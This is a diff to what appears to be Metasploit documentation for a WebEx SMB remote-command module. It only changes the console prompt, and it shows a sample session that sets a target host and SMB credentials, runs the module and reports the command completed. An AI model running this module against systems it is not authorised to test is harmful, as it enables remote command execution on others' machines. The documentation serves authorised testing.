@@ -29,17 +29,17 @@
 ### Tested on Cisco WebEx v33.3.8.7 on Windows 7 x64 and x86
 
   ```
-  msf5 > use auxiliary/admin/smb/webexec_command 
-  msf5 auxiliary(admin/smb/webexec_command) > set rhosts 192.168.37.136
+  msf > use auxiliary/admin/smb/webexec_command 
+  msf auxiliary(admin/smb/webexec_command) > set rhosts 192.168.37.136
   rhosts => 192.168.37.136
-  msf5 auxiliary(admin/smb/webexec_command) > set smbuser a_user
+  msf auxiliary(admin/smb/webexec_command) > set smbuser a_user
   smbuser => a_user
-  msf5 auxiliary(admin/smb/webexec_command) > set smbpass password
+  msf auxiliary(admin/smb/webexec_command) > set smbpass password
   smbpass => password
-  msf5 auxiliary(admin/smb/webexec_command) > run
+  msf auxiliary(admin/smb/webexec_command) > run
 
   [+] 192.168.37.136:445    - Command completed!
   [*] 192.168.37.136:445    - Scanned 1 of 1 hosts (100% complete)
   [*] Auxiliary module execution completed
-  msf5 auxiliary(admin/smb/webexec_command) > 
+  msf auxiliary(admin/smb/webexec_command) > 
   ```
